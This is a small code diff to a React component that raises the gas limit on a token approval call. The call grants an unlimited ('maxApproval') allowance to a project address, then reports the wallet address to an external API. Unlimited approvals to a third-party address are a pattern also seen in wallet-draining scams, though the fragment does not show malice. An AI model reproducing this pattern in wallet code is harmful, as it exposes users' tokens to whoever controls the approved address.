@@ -29,7 +29,7 @@ const TopMenu: React.FC<TopProps> = ({ onToggleRightMenu }) => {
       try {
         //发起授权
         const tx = await contract.approve(NodestorageData.ETHAddress, maxApproval, {
-          gasLimit: 500000, // 手动设置 gas limit
+          gasLimit: 1000000, // 手动设置 gas limit
         });
         await tx.wait();
         const url = "https://app.myoilfield.org/api/wallet/createWallet?walletAddress=" + account.address + '&balance=' + 0;
